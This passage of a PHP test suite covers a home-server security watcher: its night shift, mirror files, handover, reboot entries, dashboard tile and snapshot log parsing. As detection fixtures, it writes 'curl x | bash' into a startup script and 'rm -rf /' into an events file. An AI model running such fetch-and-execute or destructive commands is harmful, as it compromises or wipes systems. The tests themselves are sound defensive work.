    same('night mirror: changed within the hour — RAM only', ['ram', $flashBefore], [watchmanMirrorWrite($day, $ram, $flash, $now + 1000, $boot1), (string) file_get_contents($flash)]);
    touch($flash, $now - 3700);
    same('night mirror: changed and an hour old — the flash too', 'flash', watchmanMirrorWrite($day, $ram, $flash, $now + 1000, $boot1));
    same('night mirror: the plugin\'s entry is open in it', ['login_new_ip:10.0.0.5', 'plugin_new:new'], array_column(readJson($flash)['open'], 'key'));
    $sentDay = count($calls());

    // the array stops: the night shift from the RAM mirror — never the data folder
    $t = $now + 1100;
    file_put_contents($paths['array_events'], "$t stop\n");
    file_put_contents($paths['syslog'], $line($t - 60, 'webgui: Successful login user root from 192.168.7.10')
        . $line($t + 30, 'webgui: Successful login user root from 10.0.0.5')           // the open one again: counted there
        . $line($t + 40, 'sshd-session[9]: Accepted publickey for root from 10.0.0.77 port 1 ssh2: x'), FILE_APPEND);
    file_put_contents($paths['go'], "curl x | bash\n", FILE_APPEND);
    $listing = function (string $dir): array {
        $out = [];
        foreach (is_dir($dir) ? new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS)) : [] as $file) {
            $out[(string) $file] = [$file->getSize(), $file->getMTime()];
        }
        ksort($out);
        return $out;
    };
    $dataBefore = $listing(DATA_DIR);
    $dayBefore = $listing($day);
    check('night paths: nothing under /mnt or the data folder', !array_filter(watchmanNightPaths(),
        fn ($p) => is_string($p) && (str_starts_with($p, '/mnt') || str_starts_with($p, DATA_DIR))), json_encode(watchmanNightPaths()));
    same('night paths: no shares, no snapshots, no data flow, no office record', [], array_values(array_intersect(array_keys(watchmanNightPaths()),
        ['sec', 'sec_nfs', 'share_cfg', 'zfs', 'zpool', 'mnt', 'agent_log', 'snap_record', 'engine', 'office_installs'])));
    $r = watchmanNightRound($nightPaths, $night, $t + 60, true, fn () => [], $ram, $flash, $boot1);
    same('night: begun from the RAM mirror', ['hired' => 1000, 'from' => 'ram'], $r['begun'] ?? null);
    same('night: neither the data folder nor the day\'s files touched', [$dataBefore, $dayBefore], [$listing(DATA_DIR), $listing($day)]);
    $nb = watchmanLoad($night)['book'];
    $byKey = array_column($nb, null, 'key');
    same('night: a new address and go — new; the open one only counted on', [['flash_go', 'login_new_ip:10.0.0.77'], 2],
        [(function (array $k): array { sort($k); return $k; })(array_values(array_diff($openKeys($nb), ['login_new_ip:10.0.0.5', 'plugin_new:new']))),
         $byKey['login_new_ip:10.0.0.5']['count'] ?? null]);
    $stop = $byKey["array_stop:$t"] ?? [];
    same('night: the array\'s stop as a plain line, noted by himself, with who had logged in around then',
        ['array_stop', 'array', ['192.168.7.10', '10.0.0.5', '10.0.0.77'], 'T1489', false],
        [$stop['kind'] ?? null, $stop['by'] ?? null, array_column($stop['p']['logins'] ?? [], 'ip'), WATCH_ATTACK['array_stop'], WATCH_KINDS['array_stop'][1]]);
    $sent = array_slice($calls(), $sentDay);
    // login_new_ip was told at +300: still within its quiet hour (the mirror carries it); go is a new kind
    same('night: told like the day — the same kinds, the same quiet hour', [1, true, false],
        [count($sent), str_contains($sent[0] ?? '', 'flash') || str_contains($sent[0] ?? '', 'go'), str_contains(implode('', $sent), '10.0.0.77')]);
    $nst = watchmanLoad($night)['state'];
    $syslogEnd = filesize($paths['syslog']);
    same('night: the syslog read on from the day\'s place', $syslogEnd, $nst['syslog']['size'] ?? null);
    // what the office's page and the Dashboard tile say meanwhile (officeNightShift()): its rounds, what is new in it and open
    // (the go line and the new address — not the day's open entry it only counted on, not the array's line he noted himself)
    same('night: its rounds and what is new in it', [$t + 60, 1, 2], [$nst['night']['since'] ?? null, $nst['night']['rounds'] ?? null, $nst['night']['new'] ?? null]);
    watchmanNightRound($nightPaths, $night, $t + 360, false, fn () => [], $ram, $flash, $boot1);
    same('night: a second round counted, nothing more new', [$t + 60, 2, 2], array_values(array_intersect_key(watchmanLoad($night)['state']['night'] ?? [],
        ['since' => 1, 'rounds' => 1, 'new' => 1])));
    $nst = watchmanLoad($night)['state'];

    // never two of them: while the night shift holds its lock, the day waits
    $h = fopen($lock, 'c');
    flock($h, LOCK_EX);
    same('night lock: on', [true, ['busy' => true]], [watchmanNightOn($lock), watchmanNightHandover($day, $night, $t + 600, $lock)]);
    flock($h, LOCK_UN);
    fclose($h);
    check('night lock: off', !watchmanNightOn($lock));

    // the array starts: the agent takes the night over — the syslog's place, the entries once, the open one counted on
    file_put_contents($paths['syslog'], $line($t + 500, 'webgui: Successful login user root from 10.0.0.99'), FILE_APPEND);     // after the night's last round
    $dayBook = watchmanLoad($day)['book'];
    $before = array_column($dayBook, null, 'key');
    $h = watchmanNightHandover($day, $night, $t + 600, $lock);
    same('handover: new and brought up to date', ['new' => 3, 'updated' => 1], $h);
    $d = watchmanLoad($day);
    $byKey = array_column($d['book'], null, 'key');
    same('handover: the night\'s entries carry «night», the stop line too', [true, true, true, false],
        [!empty($byKey['flash_go']['night']), !empty($byKey['login_new_ip:10.0.0.77']['night']), !empty($byKey["array_stop:$t"]['night']),
         !empty($byKey['login_new_ip:10.0.0.5']['night'])]);
    same('handover: the open entry counted on, still told once', [(int) $before['login_new_ip:10.0.0.5']['count'] + 1, $before['login_new_ip:10.0.0.5']['told']],
        [$byKey['login_new_ip:10.0.0.5']['count'], $byKey['login_new_ip:10.0.0.5']['told']]);
    same('handover: no key open twice', count($openKeys($d['book'])), count(array_unique($openKeys($d['book']))));
    same('handover: the syslog\'s place and what was told taken over; the night\'s files gone', [$syslogEnd, true, []],
        [$d['state']['syslog']['size'] ?? null, isset($d['state']['notified']['flash_go']), array_values(array_filter(WATCH_NIGHT_FILES, fn ($f) => is_file("$night/$f")))]);
    same('handover: nothing left to take over', null, watchmanNightHandover($day, $night, $t + 601, $lock));
    same('handover: the day\'s night says from, until, which mirror — no counts of its own', ['since', 'until', 'from'], array_keys($d['state']['night'] ?? []));

    // the agent's next round: the array's start, the login after the night's last round — once
    file_put_contents($paths['array_events'], ($t + 550) . " start\n", FILE_APPEND);
    $sentBefore = count($calls());
    $r = watchmanRound($paths, $day, 1000, $t + 660, $docker, true, $acks);
    $d = watchmanLoad($day);
    $byKey = array_column($d['book'], null, 'key');
    same('after the night: nothing lost — the login after its last round is new, the start is a line',
        [['login_new_ip'], 'array', ['192.168.7.10', '10.0.0.5', '10.0.0.77', '10.0.0.99']],
        [$r['added'], $byKey['array_start:' . ($t + 550)]['by'] ?? null, array_column($byKey['array_start:' . ($t + 550)]['p']['logins'] ?? [], 'ip')]);
    same('after the night: nothing twice', [[], 1, 1], [watchmanRound($paths, $day, 1000, $t + 960, $docker, true, $acks)['added'],
        count(array_filter($d['book'], fn ($e) => $e['kind'] === 'array_stop')), count(array_filter($d['book'], fn ($e) => $e['kind'] === 'array_start'))]);
    check('after the night: the page shows the chip and the night', (function () use ($day, $t): bool {
        $ps = watchmanPageState($day, $t + 960, false);
        return (bool) array_filter($ps['book'], fn ($e) => $e['night']) && ($ps['night']['from'] ?? null) === 'ram' && ($ps['night']['until'] ?? 0) > 0;
    })());

    // a reboot: no RAM mirror of this boot — the flash's; this boot's syslog from its start, passwords from the first look
    watchmanMirrorWrite($day, $ram, $flash, $t + 960, $boot1);
    touch($flash, $t - 7200);
    watchmanMirrorWrite($day, $ram, $flash, $t + 960, $boot1);
    file_put_contents("$tmp/boot_id", "$boot2\n");
    $boot = $t + 3600;
    file_put_contents("$tmp/stat", "cpu  1 2 3\nbtime $boot\nprocesses 9\n");
    file_put_contents($paths['syslog'], $line($boot + 10, 'webgui: Successful login user root from 192.168.7.10')
        . $line($boot + 20, 'webgui: Successful login user root from 10.0.0.123'));
    file_put_contents($paths['shadow'], 'root:$6$zz$yy:20000:0:99999:7:::' . "\n");     // changed while it was off: the agent's to find
    $r = watchmanNightRound($nightPaths, $night, $boot + 60, false, fn () => [], $ram, $flash, $boot2);
    $nb = watchmanLoad($night)['book'];
    same('reboot: a new night counts anew', [$boot + 60, 1], [watchmanLoad($night)['state']['night']['since'] ?? null, watchmanLoad($night)['state']['night']['rounds'] ?? null]);
    // the reboot left no array line (its clock lay in RAM): the night shift books the server's start, at the kernel's btime
    $sb = array_values(array_filter($nb, fn ($e) => $e['kind'] === 'server_boot'));
    same('reboot: the night books the server\'s start — once, a plain line at its btime, with who logged in then',
        [1, "server_boot:$boot2", $boot, 'array', true, ['192.168.7.10', '10.0.0.123'], 'T1529', false],
        [count($sb), $sb[0]['key'] ?? null, $sb[0]['time'] ?? null, $sb[0]['by'] ?? null, !empty($sb[0]['noted']),
         array_column($sb[0]['p']['logins'] ?? [], 'ip'), WATCH_ATTACK['server_boot'], WATCH_KINDS['server_boot'][1]]);
    watchmanNightRound($nightPaths, $night, $boot + 90, false, fn () => [], $ram, $flash, $boot2);
    same('reboot: the night\'s next round — still once', 1, count(array_filter(watchmanLoad($night)['book'], fn ($e) => $e['kind'] === 'server_boot')));
    same('reboot: begun from the flash, this boot\'s syslog from its start; a password the first look stands for',
        [['hired' => 1000, 'from' => 'flash'], true, false],
        [$r['begun'] ?? null, in_array('login_new_ip:10.0.0.123', $openKeys($nb), true), in_array('flash_password:root', $openKeys($nb), true)]);
    // and the agent, after the handover, still finds the password against its own book
    watchmanNightHandover($day, $night, $boot + 120, $lock);
    watchmanRound($paths, $day, 1000, $boot + 180, $docker, false, $acks);
    check('reboot: the changed password is the agent\'s find after the start', in_array('flash_password:root', $openKeys(watchmanLoad($day)['book']), true));
    $sb = array_values(array_filter(watchmanLoad($day)['book'], fn ($e) => $e['kind'] === 'server_boot'));
    same('reboot: the night\'s line of the server\'s start taken over — the day books it no second time', [1, true, $boot2],
        [count($sb), !empty($sb[0]['night']), watchmanLoad($day)['state']['boot_seen'] ?? null]);

    // no mirror: no night shift, nothing written
    hardeningRm($night);
    same('night: without a mirror none', [null, false], [watchmanNightRound($nightPaths, $night, $boot, false, fn () => [], "$tmp/none.json", "$tmp/none2.json", $boot2),
        is_file("$night/book.json")]);
    // let go: the mirrors go
    hardeningRm($day);
    same('night mirror: not on watch — both gone', ['none', false, false], [watchmanMirrorWrite($day, $ram, $flash, $boot), is_file($ram), is_file($flash)]);

    // the SIEM switch had shared the syslog's place up to 1.30
    same('state: an old SIEM switch moves to siem, the place is read anew', [['syslog' => null, 'siem' => true], ['syslog' => ['ino' => 1, 'size' => 2]]],
        [watchmanStateFix(['syslog' => true]), watchmanStateFix(['syslog' => ['ino' => 1, 'size' => 2]])]);
    same('array events: only their shape, oldest first', [[5, 'x'], [[1700000000, 'stop'], [1700000100, 'start']]],
        [[5, 'x'], watchmanArrayEvents((function () use ($tmp): string {
            file_put_contents("$tmp/ev", "1700000100 start\nrm -rf /\n1700000000 stop\n1700000000 stop now\n");
            return "$tmp/ev";
        })())]);

    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
    foreach ([$day, $night] as $dir) {
        @unlink(watchmanLockFile($dir, 'book'));
        @unlink(watchmanLockFile($dir, 'round'));
    }
    hardeningRm($tmp);
}

/**
 * A reboot leaves no array line (agent.sh's array events lie in RAM): a round that sees another boot id than the one
 * he kept books «the server was started» — once per boot, never at his first round after hiring (the night shift's
 * part and the handover: testWatchmanNight).
 */
function testWatchmanBoot(): void
{
    $now = strtotime('2026-10-07 12:00:00');
    $tmp = hardeningTmp('watchboot');
    $src = "$tmp/src";
    $day = "$tmp/data/watchman";
    foreach (['plugins', 'extra', 'ssh/root'] as $d) {
        @mkdir("$src/$d", 0700, true);
    }
    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini", 'share_cfg' => "$src/share.cfg",
              'etc_passwd' => "$src/passwd", 'boot_id' => "$tmp/boot_id", 'stat' => "$tmp/stat"];
    $line = fn (int $t, string $s) => date('M ', $t) . str_pad(date('j', $t), 2, ' ', STR_PAD_LEFT) . date(' H:i:s', $t) . " Tower $s\n";
    file_put_contents($paths['syslog'], $line($now - 60, 'webgui: Successful login user root from 192.168.7.10'));
    file_put_contents($paths['go'], "#!/bin/bash\n/usr/local/sbin/emhttp &\n");
    file_put_contents($paths['passwd'], "root:x:0:0:Console and webGui login account:/root:/bin/bash\n");
    file_put_contents($paths['shadow'], 'root:$6$aa$bb:20000:0:99999:7:::' . "\n");
    foreach (['sec', 'sec_nfs', 'share_cfg'] as $k) {
        file_put_contents($paths[$k], '');
    }
    $docker = fn () => [];
    $acks = "$tmp/acks.json";
    $bootA = 'bbbbbbbb-0000-4000-8000-00000000000a';
    $bootB = 'bbbbbbbb-0000-4000-8000-00000000000b';
    $bootC = 'bbbbbbbb-0000-4000-8000-00000000000c';
    $boots = fn () => array_values(array_filter(watchmanLoad($day)['book'], fn ($e) => $e['kind'] === 'server_boot'));
    $setBoot = function (string $id, int $btime) use ($tmp): void {
        file_put_contents("$tmp/boot_id", "$id\n");
        file_put_contents("$tmp/stat", "cpu  1 2 3\nbtime $btime\nprocesses 9\n");
    };

    // an earlier hiring kept boot A; hired anew in boot B: his first round takes over — no line, only remembered
    $setBoot($bootA, $now - 86400);
    watchmanRound($paths, $day, 900, $now - 3600, $docker, false, $acks);
    $setBoot($bootB, $now - 600);
    watchmanRound($paths, $day, 1000, $now, $docker, false, $acks);
    same('boot: never at his first round after hiring (another boot than the old hiring\'s)', [0, $bootB], [count($boots()), watchmanLoad($day)['state']['boot_seen'] ?? null]);
    watchmanRound($paths, $day, 1000, $now + 300, $docker, false, $acks);
    same('boot: the same boot — none', 0, count($boots()));

    // a reboot: the next round books the start once, at the kernel's btime, with who logged in around then
    $up = $now + 900;
    $setBoot($bootC, $up);
    file_put_contents($paths['syslog'], $line($up + 40, 'webgui: Successful login user root from 192.168.7.10')
        . $line($up + 50, 'sshd-session[7]: Accepted publickey for root from 192.168.7.20 port 2 ssh2: x'));
    $r = watchmanRound($paths, $day, 1000, $up + 120, $docker, false, $acks);
    $b = $boots();
    same('boot: a new boot id — one plain line at its btime, noted by himself, who logged in around then (the new address apart)',
        [1, "server_boot:$bootC", $up, 'array', true, ['192.168.7.10', '192.168.7.20'], ['login_new_ip'], $bootC],
        [count($b), $b[0]['key'] ?? null, $b[0]['time'] ?? null, $b[0]['by'] ?? null, !empty($b[0]['noted']), array_column($b[0]['p']['logins'] ?? [], 'ip'),
         $r['added'], watchmanLoad($day)['state']['boot_seen'] ?? null]);
    same('boot: never told, never on the team lead\'s list', [[], []],
        [array_values(array_filter(watchmanChecks($day), fn ($f) => $f['id'] === 'server_boot')), array_values(array_filter(array_keys(watchmanOpenCounts(watchmanLoad($day)['book'])), fn ($k) => $k === 'server_boot'))]);
    watchmanRound($paths, $day, 1000, $up + 420, $docker, false, $acks);
    same('boot: the same boot again — still one', 1, count($boots()));
    same('boot: its words', 'The server was started — logged in around then: root@192.168.7.10 (WebGUI), root@192.168.7.20 (SSH (publickey))',
        officeNotifyText('watchman', 'entry.server_boot', watchmanText($boots()[0]), 'en'));

    // a state of before 1.31 (no boot_seen): the syslog position's boot tells; unknown — only remembered
    $st = watchmanLoad($day)['state'];
    unset($st['boot_seen']);
    writeAtomic("$day/state.json", jsonEncode($st));
    $setBoot($bootA, $up + 3600);
    watchmanRound($paths, $day, 1000, $up + 3700, $docker, false, $acks);
    same('boot: an older state — the syslog position\'s boot tells', [2, "server_boot:$bootA"], [count($boots()), $boots()[1]['key'] ?? null]);
    $st = watchmanLoad($day)['state'];
    unset($st['boot_seen'], $st['syslog']['boot']);
    writeAtomic("$day/state.json", jsonEncode($st));
    $setBoot($bootB, $up + 7200);
    watchmanRound($paths, $day, 1000, $up + 7300, $docker, false, $acks);
    same('boot: nothing known of the boot before — only remembered', [2, $bootB], [count($boots()), watchmanLoad($day)['state']['boot_seen'] ?? null]);
    same('boot: btime read only in its shape', [1700000000, null, null],
        [watchmanBootTime((function () use ($tmp): string { file_put_contents("$tmp/s1", "cpu 1\nbtime 1700000000\n"); return "$tmp/s1"; })()),
         watchmanBootTime((function () use ($tmp): string { file_put_contents("$tmp/s2", "xbtime 1700000000\nbtime 17x\n"); return "$tmp/s2"; })()),
         watchmanBootTime("$tmp/none")]);

    @unlink(watchmanLockFile($day, 'book'));
    @unlink(watchmanLockFile($day, 'round'));
    hardeningRm($tmp);
}

/**
 * The night shift on the office's page and on the Dashboard tile while the array is stopped: officeNightShift()
 * (src/mailbox.php) reads RAM only — the pid in its lock (a living `agent.php nightshift`; it never takes the lock, so
 * the night shift's own non-blocking lock at its start never meets it) and its state — and the web side without its
 * data folder (the array stopped) answers without a warning. In a process of its own (bootstrap.php) on a copy laid
 * out like the plugin (src/ beside the web files).
 */
function testNightUi(): void
{
    $tmp = hardeningTmp('nightui');
    $now = time();
    @mkdir("$tmp/plugin/src", 0700, true);
    foreach (glob(OFFICE_DIR . '/src/*.php') ?: [] as $f) {
        copy($f, "$tmp/plugin/src/" . basename($f));
    }
    foreach (['assets', 'desks', 'lang'] as $d) {
        @symlink(OFFICE_WEB . "/$d", "$tmp/plugin/$d");
    }
    // a night shift: a process whose command line is `… agent.php nightshift` (a stand-in that only waits); one that ended
    file_put_contents("$tmp/agent.php", "<?php sleep(60);\n");
    $quiet = [0 => ['file', '/dev/null', 'r'], 1 => ['file', '/dev/null', 'w'], 2 => ['file', '/dev/null', 'w']];
    $shift = proc_open([PHP_BINARY, "$tmp/agent.php", 'nightshift'], $quiet, $pipes);
    $pid = (int) (proc_get_status($shift)['pid'] ?? 0);
    for ($i = 0; $i < 60 && !str_contains((string) @file_get_contents("/proc/$pid/cmdline"), 'nightshift'); $i++) {
        usleep(50000);
    }
    $ended = proc_open([PHP_BINARY, "$tmp/agent.php", 'nightshift', 'x'], $quiet, $pipes);
    $gone = (int) (proc_get_status($ended)['pid'] ?? 0);
    proc_terminate($ended);
    proc_close($ended);

    $since = $now - 120;
    $state = ['hired' => 1000, 'night' => ['since' => $since, 'from' => 'ram', 'rounds' => 7, 'new' => 1], 'round' => ['time' => $now - 60]];
    $runs = [
        'on'        => [$pid, $state],
        'quiet'     => [$pid, ['night' => ['since' => $since, 'from' => 'flash', 'rounds' => 1, 'new' => 0]] + $state],
        'old'       => [$pid, ['night' => ['since' => $since, 'from' => 'ram']] + $state],      // a night shift of an older agent: no counts
        'off'       => [null, $state],                  // no lock: no night shift since the boot
        'stale'     => [$gone, $state],                 // a stale lock: its process ended (the agent took over)
        'other'     => [getmypid(), $state],            // its pid now another process's
        'junk'      => ["$pid\n1", $state],
        'no_mirror' => [$pid, null],                    // on, but no mirror (not hired, no round yet): no state, it ends at once
        'day'       => [$pid, ['night' => ['since' => 1, 'until' => 2, 'from' => 'ram']] + $state],     // the day's, after a handover
        'unhired'   => [$pid, ['hired' => 0] + $state],
    ];
    foreach ($runs as $name => [$lockPid, $st]) {
        @mkdir("$tmp/run-$name/nightshift", 0700, true);
        if ($lockPid !== null) {
            file_put_contents("$tmp/run-$name/nightshift.lock", (string) $lockPid);
        }
        if ($st !== null) {
            file_put_contents("$tmp/run-$name/nightshift/state.json", json_encode($st));
        }
    }
    // an agent at work: its data folder with a fresh agent.json and the mailbox
    @mkdir("$tmp/data/mailbox", 0700, true);
    file_put_contents("$tmp/data/agent.json", json_encode(['running' => true, 'version' => AGENT_VERSION, 'pid' => 4242, 'started' => $now, 'host' => 'test']));

    $plugin = var_export("$tmp/plugin/src", true);
    file_put_contents("$tmp/web.php", '<?php foreach (["bootstrap", "page", "dashboard", "api"] as $f) { require ' . $plugin . ' . "/$f.php"; }'
        . ' date_default_timezone_set("Europe/Zurich"); error_reporting(E_ALL);'
        . ' set_error_handler(function (int $no, string $s, string $file, int $line): bool { if (error_reporting() & $no) { fwrite(STDERR, "PHP: $s ($file:$line)\n"); } return true; });'
        . ' if ($argv[1] === "read") { $out = []; foreach (json_decode($argv[2], true) as $n) { $out[$n] = officeNightShift(' . var_export($tmp, true) . ' . "/run-$n"); }'
        . ' echo json_encode($out); exit; }'
        . ' if ($argv[1] === "api") { $_SERVER["REQUEST_METHOD"] = "GET"; $_GET = ["a" => $argv[2], "lang" => "en", "desk" => $argv[3] ?? ""]; api_main(); }'
        . ' echo json_encode(["agent" => agentInfo(), "config" => officePageConfig()["agent"], "en" => officeDashRows("en"), "de" => officeDashRows("de"),'
        . ' "fr" => officeDashRows("fr")]);');
    $web = function (array $args, string $run, string $data = 'missing') use ($tmp): array {
        $p = proc_open(array_merge([PHP_BINARY, "$tmp/web.php"], $args), [0 => ['file', '/dev/null', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes, null,
            ['OFFICE_DATA_DIR' => "$tmp/$data", 'OFFICE_RUN_DIR' => "$tmp/run-$run", 'PATH' => getenv('PATH')]);
        $out = (string) stream_get_contents($pipes[1]);
        $err = (string) stream_get_contents($pipes[2]);
        proc_close($p);
        return [json_decode($out, true), trim($err), $out];
    };

    [$read, $err, $raw] = $web(['read', json_encode(array_keys($runs))], 'on');
    same('night ui: on — since when, its rounds, what is new, the last round', ['since' => $since, 'rounds' => 7, 'new' => 1, 'last' => $now - 60], $read['on'] ?? $raw);
    same('night ui: on, nothing new yet; an older agent\'s state without counts', [[1, 0], [0, 0]],
        [[$read['quiet']['rounds'] ?? null, $read['quiet']['new'] ?? null], [$read['old']['rounds'] ?? null, $read['old']['new'] ?? null]]);
    same('night ui: off — no lock, a stale lock, another process\'s pid, junk, no mirror, the day\'s state, not hired',
        array_fill_keys(['off', 'stale', 'other', 'junk', 'no_mirror', 'day', 'unhired'], null),
        array_intersect_key($read ?? [], array_flip(['off', 'stale', 'other', 'junk', 'no_mirror', 'day', 'unhired'])));
    same('night ui: read without a word', '', $err);
    same('night ui: the lock left as it was (never taken, never written)', (string) $pid, (string) file_get_contents("$tmp/run-on/nightshift.lock"));

    // the array stopped (no data folder), the night shift on: the page knows at once, the tile has its line
    [$o, $err, $raw] = $web(['web'], 'on');
    same('night ui: no data folder, night shift on — no warning', '', $err);
    same('night ui: the agent\'s info carries it, the page gets it at once', [false, true, $read['on'], $read['on']],
        [$o['agent']['running'] ?? null, isset($o['agent']['no_data']), $o['agent']['night'] ?? null, $o['config']['night'] ?? null]);
    $at = date('Y-m-d', $since) === date('Y-m-d', $now) ? date('H:i', $since) : null;      // else «yesterday 23:59» (a run just after midnight)
    $en = (string) ($o['en'] ?? '');
    check('night ui: the tile — the messenger says the array, his line with since, rounds and what is new',
        str_contains($en, 'Array stopped') && str_contains($en, 'desks/watchman/avatar.svg') && str_contains($en, 'The Night Watchman')
        && ($at === null || str_contains($en, "Night shift since $at")) && str_contains($en, '7 rounds, 1 new entry') && str_contains($en, 'orange-text'), $raw);
    check('night ui: the tile in German and French', str_contains((string) ($o['de'] ?? ''), '7 Runden, 1 neuer Eintrag') && str_contains((string) ($o['de'] ?? ''), 'Der Nachtwächter')
        && str_contains((string) ($o['fr'] ?? ''), '7 rondes, 1 nouvelle entrée'), $raw);
    check('night ui: the tile links to the office\'s reception', (bool) preg_match('~<a class="sso-dash-row" href="[^"]*#/"><img class="sso-dash-icon" src="[^"]*desks/watchman/avatar\.svg~', $en), $en);
    [$o, , $raw] = $web(['web'], 'quiet');
    check('night ui: nothing new — calm', str_contains((string) ($o['en'] ?? ''), '1 round, nothing new') && !str_contains((string) ($o['en'] ?? ''), '1 new'), $raw);
    [$o, , $raw] = $web(['web'], 'old');
    check('night ui: no counts (an older agent) — only what is new', str_contains((string) ($o['en'] ?? ''), '<small>nothing new</small>'), $raw);

    // off (the night shift ended, its lock stays behind): nothing about it, no warning
    [$o, $err, $raw] = $web(['web'], 'stale');
    same('night ui: a stale lock — nothing on the page or the tile, no warning', [false, false, false, ''],
        [isset($o['agent']['night']), isset($o['config']['night']), str_contains((string) ($o['en'] ?? ''), 'watchman'), $err]);
    // the agent at work (the array started): never the night's line, even while a night shift still lives
    [$o, $err, $raw] = $web(['web'], 'on', 'data');
    same('night ui: the agent at work — no night line', [true, false, false, true, ''],
        [$o['agent']['running'] ?? null, isset($o['agent']['night']), str_contains((string) ($o['en'] ?? ''), 'watchman'),
         str_contains((string) ($o['en'] ?? ''), 'Messenger is in'), $err]);

    // the API: ?a=agent for the reception's look every minute, ?a=dash for the tile
    [$o, $err, $raw] = $web(['api', 'agent'], 'on');
    same('night ui: api agent', [true, $read['on'], ''], [$o['ok'] ?? null, $o['agent']['night'] ?? null, $err]);
    [$o, $err, $raw] = $web(['api', 'dash'], 'on');
    check('night ui: api dash', ($o['ok'] ?? null) === true && str_contains((string) ($o['html'] ?? ''), '7 rounds, 1 new entry') && $err === '', $raw . $err);
    [$o, $err, $raw] = $web(['api', 'state', 'caretaker'], 'on');
    same('night ui: a desk\'s state without the data folder — none, the night in the agent\'s info, no warning', [true, null, true, ''],
        [$o['ok'] ?? null, $o['state'] ?? null, isset($o['agent']['night']), $err]);

    // every text the tile asks for exists (officeDashT … '<key>')
    $en = json_decode((string) file_get_contents(OFFICE_WEB . '/lang/en.json'), true) ?: [];
    foreach (glob(OFFICE_WEB . '/desks/*/lang/en.json') ?: [] as $file) {
        foreach (json_decode((string) file_get_contents($file), true) ?: [] as $k => $v) {
            $en[basename(dirname($file, 2)) . ".$k"] = $v;
        }
    }
    preg_match_all("/officeDashT\\(\\\$s(?:trings)?, '([a-z0-9_.]+)'/", (string) file_get_contents(OFFICE_DIR . '/src/dashboard.php'), $m);
    $missing = array_values(array_filter(array_unique($m[1]), fn ($k) => !isset($en[$k])));
    check('dashboard.php: every text it asks for exists (' . count(array_unique($m[1])) . ')', $missing === [] && count($m[1]) > 10, json_encode($missing));

    proc_terminate($shift);
    proc_close($shift);
    hardeningRm($tmp);
}

function testWatchmanSnaps(): void
{
    $now = strtotime('2026-10-06 12:00:00');
    $tmp = sys_get_temp_dir() . '/office-tests-snaps-' . getmypid();
    $src = "$tmp/src";
    $data = "$tmp/data";
    foreach (['plugins', 'extra', 'ssh', 'engine/state', 'mnt/disk1/.btrfs-snap', 'mnt/disk3/.btrfs-snap/20261001-0100'] as $d) {
        @mkdir("$src/$d", 0700, true);
    }
    foreach (['20261001-0100', '20261006-0100', 'uso-plan-b-20261006-0100'] as $n) {
        @mkdir("$src/mnt/disk1/.btrfs-snap/$n", 0700, true);
    }
    file_put_contents("$src/mnt/disk1/.btrfs-snap/not-a-snapshot.txt", 'x');

    // unit parts first: the list, series, the office's log
    $docker = 'hive/system/' . str_repeat('ab', 32);
    same('snaps parse: per pool, Docker\'s layers and odd lines left out', ['hive' => ['hive/data@a' => ['11', 0], 'hive/data@b' => ['12', 2]], 'cold' => ['cold@c' => ['13', 0]]],
        watchmanSnapParse("hive/data@b\t12\t2\nhive/data@a\t11\t0\n$docker@123\t14\t0\n$docker-init@1\t15\t0\ncold@c\t13\t0\nbad name\nhive/x@y\tnot\t0\n"));
    same('snaps series: numbers as #', ['uso-plan-daily-#-#', 'autosnap_#-#-#_#:#:#_hourly', 'manual'],
        array_map('watchmanSnapSeries', ['uso-plan-daily-20261006-0100', 'autosnap_2026-10-06_14:00:01_hourly', 'manual']));
    $log = "$src/agent.log";
    file_put_contents($log, "2026-10-06 11:00:00  Deleted: hive/old@x\n");
    [$ev, $pos] = watchmanSnapOfficeLog($log, null, $now);
    same('office log: without a position, from now on', [[], filesize($log)], [$ev['d'], $pos['size']]);
    file_put_contents($log, "2026-10-06 11:01:00  Deleted: hive/My Share@a,b\n2026-10-06 11:02:00  Deleted: $src/mnt/disk1/.btrfs-snap/x (btrfs)\n"
        . "2026-10-06 11:03:00  Released: hive/data@keep\n2026-10-06 11:04:00  Renamed: /mnt/disk1 old → new\n2026-10-06 11:05:00  Snapshot scan: 3 snapshots\n"
        . "2026-10-06 11:06:00  Deleted: half", FILE_APPEND);
    [$ev, $pos2] = watchmanSnapOfficeLog($log, $pos, $now);
    same('office log: her deletions (several at once, btrfs), releases, renames — a line not finished waits',
        [['hive/My Share@a', 'hive/My Share@b', "$src/mnt/disk1/.btrfs-snap/x"], ['hive/data@keep'], [['/mnt/disk1', 'old', 'new', strtotime('2026-10-06 11:04:00')]], filesize($log) - strlen('2026-10-06 11:06:00  Deleted: half')],
        [array_keys($ev['d']), array_keys($ev['r']), $ev['m'], $pos2['size']]);
    rename($log, "$log.1");
    file_put_contents("$log.1", "\n", FILE_APPEND);
    file_put_contents($log, "2026-10-06 11:07:00  Deleted: hive/new@z\n");
    [$ev] = watchmanSnapOfficeLog($log, $pos2, $now);
    same('office log: rotated — the rest of the old one (by its inode), then the new one', ['hive/new@z'], array_keys($ev['d']));
    same('office log: what the office removed is remembered a week, the newest time counts', [['b' => $now, 'a' => $now - 10], []],
        [watchmanSnapOfficeMerge(['d' => ['a' => $now - 10, 'old' => $now - 8 * 86400, 'b' => $now - 100], 'm' => [['x', 'y', 'z', $now - 9 * 86400]]],
            ['d' => ['b' => $now]], $now)['d'], watchmanSnapOfficeMerge(['m' => [['x', 'y', 'z', $now - 9 * 86400]]], [], $now)['m']]);
    file_put_contents($log, '');
    @unlink("$log.1");
    file_put_contents("$src/engine/state/history.jsonl", json_encode(['mode' => 'backup', 'result' => 'ok', 'started' => $now - 86400, 'finished' => $now - 80000]) . "\n");
    same('engine runs: from history.jsonl (skipped ones left out), status.json while its run goes on', [true, false],
        [watchmanEngineRan(watchmanEngineRuns("$src/engine"), $now - 90000, $now), watchmanEngineRan(watchmanEngineRuns("$src/engine"), $now - 3600, $now)]);

    // the server: hive and cold (ZFS), disk1 awake and disk3 asleep (btrfs), the boot pool never asked
